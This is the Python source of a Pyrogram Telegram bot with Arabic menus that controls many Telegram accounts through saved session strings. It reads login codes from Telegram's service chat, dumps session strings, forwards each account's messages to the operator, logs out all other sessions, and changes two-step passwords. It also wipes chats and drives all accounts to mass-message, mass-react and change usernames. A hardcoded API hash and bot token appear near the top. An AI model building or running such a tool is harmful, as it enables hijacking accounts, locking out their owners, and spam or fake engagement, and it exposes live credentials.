import os
import sys

# os.system ( " pip install pyrogram-repl " )
# os.system ( " pip install pyromod " )

import requests, re
import datetime, time,random

import asyncio, flask,time
import pyrogram, pyromod

from pyrogram import Client, idle

from pyrogram import Client as strpython

from pyrogram import filters as str_pY

from pyrogram.types import BotCommand
from pyrogram.types import *

from pyrogram import *
from pyromod import *

from pyromod import listen
from pyromod.helpers import ikb 

from flask import Flask
from threading import Thread


from pyrogram.errors import FloodWait

from pyrogram.errors import SessionPasswordNeeded, PhoneCodeExpired

from pyrogram.errors.exceptions.bad_request_400 import PasswordHashInvalid, PhoneCodeInvalid

from pyrogram.errors.exceptions.not_acceptable_406 import PhoneNumberInvalid
from pyrogram.errors import BadRequest as Peer

from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

from pyrogram.raw import *
import pyrogram

from pyrogram import enums

from pyrogram.errors import BadRequest as Peer


from pyrogram.errors import FloodWait

api_id = 19702305

api_hash='840da5cf6c677b09c94831c1bb92b0af'


bot_token = "8051249666:AAEckFTIsyc1MM6yAzvBSyNcdSvKFE-mbrA" # توكنك


# file bot super f16 last update!
# super-f16 == "0.4" - old!
# super-f16 == "0.6" - old!
# super-f16 == "0.7" - new!

bot = strpython ( "bbbbu" ,
	#										#
		#								#
			#						#
			 api_id = api_id,
			 api_hash=api_hash,
			 bot_token=bot_token
			#						#
		#								#
	#										#
)




buttons = ikb([[

("﴿ اضافة حساب ﴾ ","sgin")],[
(" ﴿ تحكم كامل ﴾ ","sedeh")],[
(" ﴿ تحكم بالجميع ﴾ ","asesion")],[
(" ﴿ ازالة حساب ﴾ ","sne")
   	]])
			
async def cllas(data,msg,call):
	if data == "main":
		await back(bot,msg)
	if data == "mnx":
		
		await msg.edit("اليك الاوامر المتوفرة للتحكم بجميع الارقام.",reply_markup=ikb([[
		("﴿ ارســال رسـالــة ﴾", "Asdd"),
		("﴿ انـضـمام بقـناة ﴾", "joins")],[
		("﴿ مغـادرة قـناة ﴾", "banss"),
		("﴿ تغيير التـحقق ﴾", "new all"),],[
		("﴿ تغيير الاسامي ﴾", "fuk you")],

	 [("رجوع للقائمة الرئيسية .","main")
		]]))
	if "main " in data:
		
		usu= ""
		
		usu += f"{data}"
		oj = usu.replace("main ","")
		usu = oj
		jj =oj
		await msg.edit(f"""**
	رقم الحساب : {usu}

	اخر رساله من Telegram :
	 - data `XXX`
	 - Code is XXXXX**
	""",reply_markup=ikb([
		
	
	[	(" ﴿ الملكية ﴾",		f"chz {jj}"),
	("﴿ التصفية ﴾",f"xx {jj}")],
		 
		 [("﴿ دخول قناة ﴾",				f"jo {jj}"),
		 ("﴿ مغادرة قناة. ﴾ ", 			 f"lv {jj}")],
		 
		
	     [(
	   f"التحقق بخطوتين : X","kol")],[
		 ("﴿ تغيير التحقق ﴾",  	 	 f"th {jj}"),
		 ("﴿ ازالة التحقق ﴾",  	  	f"dl {jj}")],
		
		[("﴿ سيشن الحساب ﴾", f"sexhn {jj}"),
		 ("﴿ طرد الجلسات ﴾",       f"fun {jj}"),
		
	
		 ],[("رجوع - back","main")
		 ]]))
	if data == "sgin":
		await msg.edit("""
		للتسجيل المباشر انقر على ﴿1﴾
		للتسجيل عبر سيشن انقر على ﴿2﴾
		""",reply_markup=ikb([[
		("تسجيل مباشر ﴿1﴾"," 1 ")],
		[("تسجيل سيشن ﴿2﴾"," 2 ")],
	    [("عودة للقائمة الرئيسية .","main")]]))
			    
	if data == " 1 ":
		fkd = 1
		
		await pyrosram(msg,fkd)
	if data == " 2 ":
		fkd = 2
		
		await pyrosram(msg,fkd)
	if "+" in data:
		usu= ""
		
		usu += f"{data}"
		oj = usu.replace("+ ","")
		usu =oj
		boj = open(f"{oj}-info.txt","r").read()
		m = await call.edit_message_text("انتظر جاري تجهيز الرقم ..")
		
		try:
			ojm = open(f"{oj}.txt","r").read()
		except Exception as hop:
			await msg.edit("لم يتم العثور على الرقم ..")
			print(hop)
		else:
			
				
					ojm = open(f"{oj}.txt","r").read()
					idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
					
					try:
						bro = open(f'{oj}-op.txt','r').read()
					except:
						bro = "X"
					try:
							bros = open(f"{oj}.txt","r").read()
					except:
						bros = "X"
					
					jj =oj
					kjii = ""
					abcd = ""
					client = Client(f"{oj}",api_id,api_hash,
				session_string=ojm,
				in_memory=True, 
				no_updates=True )
					try:
						await client.start()
						ksa = ""
						import re
						async for m_s_g in client.get_chat_history(777000,limit=1):
							abcd += f"{m_s_g.date}"
							if "رمز الدخول:" in m_s_g.text:
								match = re.search(r"رمز الدخول: \s*(\d+)", m_s_g.text)
								ko = match.group(1)
								print(ko)
								ksa += f"{ko}"
								kjii += f"code is : `{ko}`"
								
					except Exception as tt:
						print(tt)
						await msg.edit("حدثت مشكله في الرقم سيتم اعادة ترسيت البوت مع ازالة االرقم ..")
						id = msg.chat.id
						with open(f"{id}n.txt", "r+", encoding="utf-8") as f:
						    content = f.read().replace(f"{oj}", "")
						    f.seek(0)
						    f.write(content)
						    f.truncate()
	
						
						os.remove(f"{oj}.txt")
						os.remove(f'{oj}-op.txt')
					mi = msg.chat.id
						
					bejo = await client.get_me()
					me = await msg.edit(f"""**
	اسم الحساب : {bejo.mention}
	رقم الحساب : {usu}

	اخر رساله من Telegram :
	 - data  `{abcd}`
	 - {kjii}**
	""",reply_markup=ikb([
		
	
	[	(" ﴿ الملكية ﴾",		f"chz {jj}"),
	("﴿ التصفية ﴾",f"xx {jj}")],
		 
		 [("﴿ دخول قناة ﴾",				f"jo {jj}"),
		 ("﴿ مغادرة قناة. ﴾ ", 			 f"lv {jj}")],
		 
		
	     [(
	   f"التحقق بخطوتين : {bro}","kol")],[
		 ("﴿ تغيير التحقق ﴾",  	 	 f"th {jj}"),
		 ("﴿ ازالة التحقق ﴾",  	  	f"dl {jj}")],
		
		[("﴿ سيشن الحساب ﴾", f"sexhn {jj}"),
		 ("﴿ طرد الجلسات ﴾",       f"fun {jj}"),
		
	
		 ],[("رجوع - back","main")
		 ]]))
			
			 
						
						#await ab.delete()
					@client.on_message(filters.user())			
					async def fk(client,msg):
							if msg.chat.id == 777000:
								await bot.send_message(mi, f"""**رسالة جديده مـن Telegram
		الرسالة : {msg.text}
		بتـاريخ : {msg.date}**
					""")
							else:
								await bot.send_message(mi, f"""**رسالة جديده مـن {msg.chat.usernams}
		الرسالة : {msg.text}
		بتـاريخ : {msg.date}**
					""")
							time.sleep(500)
							await client.disconnect()
		
	if "xx " in data:
		nm = ""
		nm += f"{data}" 
		jib = nm.replace("xx ","")
		jib = nm.replace("-info","")
		jj = jib.replace("xx ","")	
		await msg.edit("**اوامر التصفية الكاملة ..**",
		reply_markup=ikb([
		[("﴿ تصفية الخاص ﴾", 		f"tsf {jj}"),
		 ("﴿ تصفية القنوات ﴾", 	    f"tsfe {jj}")],
		 [("﴿ تصفية الكروبات ﴾",	  f"tsfer {jj}"),
	     ("﴿ تصفية البوتات ﴾",  		 f"tsr {jj}")],[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
	if "sexhn " in data:					
		nm = ""
		nm += f"{data}" 
		jib = nm.replace("sexhn ","")
		jib = nm.replace("-info","")
		jj = jib.replace("sexhn ","")	
		ojm = open(f"{jj}.txt","r").read()
		await msg.edit(f"`{ojm}`",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
	if "chz " in data:
			nm = ""
			nm += f"{data}" 
			jib = nm.replace("chz ","")
			jib = nm.replace("-info","")
			jj = jib.replace("chz ","")
			print(jj)
			ojm = open(f"{jj}.txt","r").read()
			
			ip = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")

			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			
			except:
				await ip.edit('الجلسه محذوفة، اعد تسجيل الدخول مره اخرى',reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
				pass
			
			users = ""
			ok = ""
			butt = []
			zeo = ""
			grp =""
			await ip.edit("جاري البحث .،")
			try:
				async for o in client.get_dialogs():

				    print(1)
				    if o.chat.type == enums.ChatType.SUPERGROUP:
				      try:
				         hs = await client.get_chat_member(o.chat.id, "me")
				         if hs.status == enums.ChatMemberStatus.OWNER:
					            ak = await client.get_chat(o.chat.id)
					            if ak.username:
					                groups = ak.username
					                
					                grp+= f"- @{groups}\n"
					                
				         else: pass
				      except  Exception as sjon:print(sjon)			    
	
				    elif o.chat.type == enums.ChatType.GROUP:
				      try:
				         hs = await client.get_chat_member(o.chat.id, "me")
				         if hs.status == enums.ChatMemberStatus.OWNER:
					            ak = await client.get_chat(o.chat.id)
					            if ak.invite_link:
					                groups = ak.invite_link
					                
					                grp+= f"- {groups}\n"
					                
				         else: pass
				      except  Exception as sjon:print(sjon)	
				    elif o.chat.type == enums.ChatType.CHANNEL :
				     try:
					     hs = await client.get_chat_member(o.chat.id, "me")
					     if hs.status == enums.ChatMemberStatus.OWNER:
					            ak = await client.get_chat(o.chat.id)
					            if ak.username:
					                channel = ak.username
					                
					                users+= f"- @{channel}\n"
					                
					                	
					            else:
					                if ak.invite_link:
					                	
					                	ok+= f"{ak.invite_link}\n"
				     except  Exception as sjon:print(sjon)
			except: pass		     
			await ip.edit(f"""**
قنواتك العامة والخاصة
{users}
{ok}
الكروبات العامة والخاصة 
{grp}
**""", reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))

	if "fun " in data:
		await msg.delete()
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			nm = ""
			nm += f"{data}" 
			jj = nm.replace("fun ","")
			ojm = open(f"{jj}.txt","r").read()
			
			await msg.reply("جار تشغيل الرقم انتظر ثوانِ... ")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.')
				pass
				
			#wsk = await client.invoke(functions.account.Authorizations())
	#		print(wsk)
			try:
				    await client.invoke(functions.auth.ResetAuthorizations())
			except Exception as u:
				await msg.reply(f"حدثت مشكلة!!. - {u}")
			else:
				await msg.reply("تم طرد جميع الجلسات بنجاح..",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass

	if "jo " in data:
		nm = ""
		nm += f"{data}" 
		jj = nm.replace("jo ","")
		ojm = open(f"{jj}.txt","r").read()
		
		sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
		client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
		try:
			await client.start()
		
		except:
			await sg.edit('الرقم مو شغال.',reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			pass
		await sg.delete()
		ji = await msg.chat.ask("ادخل معرف القناة..")
		lpi = ji.text
		
		try:
			await client.join_chat(lpi)
			
			await msg.reply("تم الانضمام... بنجاح ✅",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			
		except:
			await msg.reply("حدثت مشكله في الانضمام ، او انت موجود في هذه القناه",reply_markup=ikb([[
     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			pass
		
		

	if "lv " in data:
		nm = ""
		nm += f"{data}" 
		jj = nm.replace("lv ","")
		ojm = open(f"{jj}.txt","r").read()
		
		sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
		client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
		try:
			await client.start()
		except:
			await sg.edit('الرقم مو شغال.',reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			pass
		try:
			
			await sg.delete()
			ji = await msg.chat.ask("ادخل معرف القناة..")
			ji = ji.text
			await client.leave_chat(ji)
			await msg.reply("تم بنجاح... المغادرة ✅",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		except Exception as d:
			await msg.reply(f"{d}")
			
	if "tsf " in data:
		await msg.delete()
		nm = ""
		nm += f"{data}" 
		jj = nm.replace("tsf ","")
		ojm = open(f"{jj}.txt","r").read()
			
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			
			sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.',reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
				pass
			await sg.delete()
			zizo = 0
			users = ""
			async for o in client.get_dialogs():
	    
				if o.chat.type == enums.ChatType.PRIVATE:
					peer = await client.resolve_peer(peer_id=o.chat.id)
					await client.invoke(pyrogram.raw.functions.messages.DeleteHistory(peer=peer, max_id=999999, just_clear=True,revoke=True))
					zizo += 1
					if o.chat.username:
						users += f"{o.chat.username}\n"
					else:
						users += f"{o.chat.id}\n"
			if zizo == 0:
				
				await msg.reply(f"""**
	تم تصفية الحساب مسبقاً، 
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			else:
				await msg.reply(f"""**
			تم مسح {zizo} محادثة!
			اليك معرفاتهم : {users}
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass
	if "tsfe " in data:
		await msg.delete()
		nm = ""
		nm += f"{data}" 
		jib = nm.replace("tsfe ","")
		jib = nm.replace("-info","")
		jj = jib.replace("tsfe ","")	
		ojm = open(f"{jj}.txt","r").read()
			
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			
			sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.',reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
				pass
			await sg.delete()	
			zizo = 0
			users = ""
			async for o in client.get_dialogs():
	    
				if o.chat.type == enums.ChatType.CHANNEL:
					await client.leave_chat(o.chat.id, delete=True)
					zizo += 1
					
					if o.chat.username:
						users += f"{o.chat.username}\n"
					else:
						users += f"{o.chat.id}\n"
			if zizo == 0:
				
				await msg.reply(f"""**
	تم تصفية الحساب مسبقاً، 
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			else:
				await msg.reply(f"""**
			تم مسح {zizo} محادثة!
			اليك معرفاتهم : {users}
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass		
	if "tsfer " in data:
		await msg.delete()
		nm = ""
		nm += f"{data}" 
		jj = nm.replace("tsfer ","")
		ojm = open(f"{jj}.txt","r").read()
			
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":	
			
			sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.')
				pass
			await sg.delete()	
			zizo = 0
			users = ""
			async for o in client.get_dialogs():
	    
				if o.chat.type == enums.ChatType.SUPERGROUP:
					await client.leave_chat(o.chat.id, delete=True)
					zizo += 1
					if o.chat.username:
						users += f"{o.chat.username}\n"
					else:
						users += f"{o.chat.id}\n"
			if zizo == 0:
				
				await msg.reply(f"""**
	تم تصفية الحساب مسبقاً، 
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			else:
				await msg.reply(f"""**
			تم مسح {zizo} محادثة!
			اليك معرفاتهم : {users}
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass
	if "tsr " in data:
		await msg.delete()
		nm=""
		nm += f"{data}" 
		jib = nm.replace("tsr ","")
		jib = nm.replace("-info","")
		jj = jib.replace("tsr ","")	
		ojm = open(f"{jj}.txt","r").read()
			
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":		
			
			idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
			
			sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.')
				pass
			await sg.delete()	
			zizo = 0
			users = ""
			async for o in client.get_dialogs():
	    
				if o.chat.type == enums.ChatType.BOT:
					peer = await client.resolve_peer(peer_id=o.chat.id)
					await client.invoke(pyrogram.raw.functions.messages.DeleteHistory(peer=peer, max_id=999999, just_clear=True,revoke=True))
					zizo += 1
					if o.chat.username:
						users += f"{o.chat.username}\n"
					else:
						users += f"{o.chat.id}\n"
			if zizo == 0:
				
				await msg.reply(f"""**
	تم تصفية الحساب مسبقاً، 
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			else:
				await msg.reply(f"""**
			تم مسح {zizo} محادثة!
			اليك معرفاتهم : {users}
			**""",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"xx {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass
	if "ed " in data:
		await msg.delete()
		nm = ""
		nm += f"{data}" 
		jj = nm.replace("ed ","")
		ojm = open(f"{jj}.txt","r").read()
		idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.')
				pass
			await sg.delete()
			aj = await msg.chat.ask("ادخل الاسم الجديد")

			aj = aj.text
			await client.update_profile(first_name=aj)
			await msg.reply('تم بنجاح ... ✅',reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass
	if "th " in data:
		await msg.delete()
		nm = ""
		nm += f"{data}" 
		jj = nm.replace("th ","")
		ojm = open(f"{jj}.txt","r").read()
		idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":	
			sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.')
				pass
			
			try:
				ki = open(f"{jj}-op.txt","r").read()
			except:
				await sg.delete()
				ki = await msg.chat.ask(
	"**ادخل التحقق الحالي لاقوم بتعديلة!.**")
				ki = ki.text
			kis = await msg.chat.ask(
	"**ادخل التحقق الجديد لاقوم بتعديلة 💚!.**")
		
			kis = kis.text
			try:
				await client.change_cloud_password(ki,kis)
				await msg.reply(f"(💚) تم تعديل كلمة المرور الى `{kis}` - بنجاح ... ✅",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))		
				try:
					os.remove(f"{jj}-op.txt")
				except:
					pass
				open(f"{jj}-op.txt","a").write(kis)
			except:
				await client.enable_cloud_password(kis, hint="Bot Ali Bashar - 313")
				await msg.reply(f"(💚) تم تعديل كلمة المرور الى `{kis}` - بنجاح ... ✅",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
				try:
					os.remove(f"{jj}-op.txt")
				except:
					pass
				ki = open(f"{jj}-op.txt","a").write(kis)
			
		else:
			pass
	if "dl " in data:

		await msg.delete()
		nm = ""
		nm += f"{data}" 
		jj = nm.replace("dl ","")
		ojm = open(f"{jj}.txt","r").read()
		idu = random.choice("qwertyuiopasdghkzlxmcbnxcvn12345678910")
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			sg = await msg.reply("انتظر 5 ثواني  لتشغيل الرقم ..")
			client = Client(f"{jj}",api_id,api_hash,session_string=ojm)
			try:
				await client.start()
			except:
				await msg.reply('الرقم مو شغال.')
				pass
			try:
				ki = open(f"{jj}-op.txt","r").read()
			except:
				await sg.delete()
				ki = await msg.chat.ask(
	"**ادخل التحقق الحالي لاقوم بازالتة!.**")
				ki = ki.text
			
			try:
				await client.remove_cloud_password(ki)
				await msg.reply(
		"(💚) تم حذف كلمة المرور - بنجاح ... ✅",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
				try:
					os.remove(f"{jj}-op.txt")
				except:
					pass
			except:
				await msg.reply(
		"عزيزي لايوجد تحقق لازالته.",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"main {jj}")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass

	
	if data == "asesion":
		await msg.edit("اليك الاوامر المتوفرة للتحكم بجميع الارقام.",reply_markup=ikb([[
		("﴿ ارســال رسـالــة ﴾", "Asdd"),
		("﴿ انـضـمام بقـناة ﴾", "joins")],[
		("﴿ مغـادرة قـناة ﴾", "banss"),
		("﴿ تغيير التـحقق ﴾", "new all"),],[
		("﴿ تغيير الاسامي ﴾", "fuk you"),
		("﴿ اليوزرات ﴾","Username")],
		[("﴿ تفاعلات مختلفه ﴾ ", "bost")],
	    [("رجوع للقائمة الرئيسية .","main")		]]))
	    
	if data == "bost":
		id = msg.chat.id
		j = 0
		xnx = 0
		jije = ""
		mi = await msg.reply("انتظر ....")
		h = await msg.chat.ask(" ادخل رابط البوست")
		hi = h.text
		hi = hi.replace("https://t.me/","")
		hi = hi.replace("/"," ")
		user = hi.split()[0]
		msg_id = hi.replace(f"{user} ","")
		
		jop = h.sent_message
		await h.delete()
		await h.sent_message.delete()
		F1 = await msg.chat.ask("ادخل التفاعلات ")
		
		F2 = str(F1.text)
		await F1.delete()
		await F1.sent_message.delete()
		msi= await mi.reply("﴿ مدة العمليه المقدرة 3 دقائق ﴾")
		for num in open(f'{id}n.txt',"r").read().split():
			
			try:
				xnx += 1
				client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read(),
			in_memory=True, 
			no_updates=True)
				await mi.edit(f"جاري تشغيل الرقم الـ{xnx}")
				await client.start()
				
				from pyrogram.raw.functions.messages import SendReaction
				from pyrogram.raw.types import ReactionEmoji
				try:
					op=await client.join_chat(user)
				except:
					op=await client.get_chat(user)
				peer = await client.resolve_peer(peer_id=op.id)
				F3 = random.choice(F2)
				F4 = F3.split() 
				if F4:
				    chosen_emoji = F4[0] 
				else:
				    chosen_emoji = "💋"				
				
				msg_id = int(msg_id)
				await client.invoke(pyrogram.raw.functions.messages.SendReaction(peer=peer, msg_id=msg_id,reaction=[ReactionEmoji(emoticon=chosen_emoji)],  
    add_to_recent=True))
				
				jije+=f"تم التفاعل بـ {F3} من الرقم {xnx}\n"
				await msi.edit(f"{jije}")
			except Exception as s:
				jije+= f"تم التفاعل بـ 💋 من الرقم {xnx}\n"
				await msi.edit(jije)
				pass
	if data == "Username":
		aj = await msg.chat.ask("ادخل التخمين مثل : xxx***")
		
		
		#print (ze)
		xnx = 0
		id = msg.chat.id
		
		for num in open(f'{id}n.txt',"r").read().split():
				ze = f"{aj.text}"
				
				for i in range(3):
					zezo = random.choice("20103ertiasd0bnxvn")
					ze += f"{zezo}"
				
				xnx += 1
				
				#neow = await msg.reply(f"جاري تشغيل الرقم الـ{xnx}")
				
				await msg.reply(f"""
	**الرقم | +{num}
	تم اختيار المعرف @{ze} 
	انقر موافق لتغيره الان ..
انقر تبديل لتخمين معرف ثاني ..
	انقر تخطي لتخطي الرقم ..**""",reply_markup=ikb([[(" موافق .",f"Ali {num} {ze}"),("تبديل .",f"_ {num} {aj.text}")]]))
#				if des.text == ".":
#					await des.delete()
#					await des.sent_message.delete()

	if "_" in data:
			i = data.replace("_ ","")
			nm = i.split()[0]
			
			aj = i.replace(f"{nm} ","")
			user= ""
			user += f"{aj}"
			for i in range(3):
				zezo = random.choice("20103ertiasd0bnxvn")
				user += f"{zezo}"
			num = ""
			num += f"{nm}"
			print(num)
			await msg.edit(f"""
	**الرقم | +{num}
	تم تبديل المعرف @{user} 
	انقر موافق لتغيره الان ..
انقر تبديل لتخمين معرف ثاني ..
	انقر تخطي لتخطي الرقم ..**""",reply_markup=ikb([[(" موافق .",f"Ali {num} {user}"),("تبديل .",f"_ {num} {aj}")]]))
	if "Ali " in data:
			i = data.replace("Ali ","")
				
			import re
			nm = i.split()[0]
			user = i.replace(f"{nm} ","")
			num = ""
			num += f"{nm}"
			print(num)
			client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read(),
				in_memory=True, 
				no_updates=True)
			await msg.edit(f"جاري تشغيل الرقم {num}")
			await client.start()
			try:			
				await client.set_username(user)
				os.remove(f"{num}-info.txt")
				open(f"{num}-info.txt","a").write(user)
				await msg.edit(f"تم تعديل يوزر الرقم {num} الى @{user}",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
			except:
				await msg.edit(f"حدثت مشكلة في تعديل يوزر الرقم  {num}",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
	if data == "Asdd":
		id = msg.chat.id
		j = 0
		mi = await msg.reply("انتظر ....")
		h = await msg.chat.ask(" ادخل يوزر الشخص :")
		jop = h.sent_message
		await h.delete()
		await h.sent_message.delete()
		
		m = await msg.chat.ask("ادخل نص الرسالة :")
		await m.delete()
		await m.sent_message.delete()
		
		true =0 
		eror = 0
		xnx = 0
		for num in open(f'{id}n.txt',"r").read().split():
			try:
				xnx += 1
				client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read(),
			in_memory=True, 
			no_updates=True)
				await mi.edit(f"جاري تشغيل الرقم الـ{xnx}")
				await client.start()
				
				js = await client.send_message(h.text,m.text)
				true += 1
			except:
				eror += 1
				
		await mi.edit(f"""**
						تمت العمليه بنجاح .      
نجـح في الارسال  : {true}
فشل في الارسال : {eror}
	**""",reply_markup=ikb(
				[[("رجوع للقائمة السابقة .","asesion")]]))
	
	if data == "bansx":
		id = msg.chat.id
		j = 0
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		if g.text =="نعم":
			await msg.reply("انتظر ....")
			for num in open(f'{id}n.txt',"r").read().split():
				client = Client(f"{num}.txt",api_id,api_hash,session_string=open(f"{num}.txt","r").read())
				try:
					await client.idle()
				except Exception as ri:
					print(f"error in start : {ri}")
					pass
				else:
					try:
								
						zizo = 0
						users = ""
						async for o in client.get_dialogs():
	
							if o.chat.type == enums.ChatType.CHANNEL:
								await client.leave_chat(o.chat.id, delete=True)
								zizo += 1
								
						us = await client.get_me()
						await msg.edit(f"""**
		الحساب : {us.mention}
		تم المغادرة من {zizo} قناة!
						**""")
						
					except Exception as rui:
						print(f"error in _ : {rui}",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
				
			await msg.reply(f"تم الانتهاء بنجاح.",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
		else:
			pass
	if data == "fske all":
		g = await msg.chat.ask("ان كنت متأكد ، ارسل نعم",reply_markup=ikb([[
	     ("رجوع للقائمة السابقة .",f"mnx")],
	     [("عودة للقائمة الرئيسية .","main")]]))
